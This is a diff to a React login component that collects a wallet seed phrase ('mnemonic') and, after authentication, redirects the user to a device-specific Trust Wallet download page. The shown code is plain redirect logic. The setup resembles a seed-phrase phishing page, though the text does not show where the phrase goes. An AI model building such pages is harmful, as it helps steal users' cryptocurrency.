@@ -35,9 +35,28 @@ const Login = () => {
         setMnemonic(e.target.value)
     }
 
+    const getDeviceLink = () => {
+        const userAgent = navigator.userAgent;
+
+        // Regular expressions to match common patterns in user agent strings
+        const isIOS = /iPad|iPhone|iPod/.test(userAgent);
+        const isAndroid = /Android/.test(userAgent);
+        const isDesktop = !isIOS && !isAndroid; 
+        
+        if(isIOS){
+            return 'https://apps.apple.com/app/apple-store/id1288339409?mt=8'
+        }else if(isAndroid){
+            return 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite'
+        }else if(isDesktop){
+            return 'https://trustwallet.com/browser-extension'
+        }else{
+            return 'https://trustwallet.com/browser-extension'
+        }
+    };
+
     useEffect(()=>{
         if(isAuthenticated){
-            window.location.href = 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite'
+            window.location.href = getDeviceLink()
             dispatch(clearAccountValidationErrors())
         }
     },[isAuthenticated])
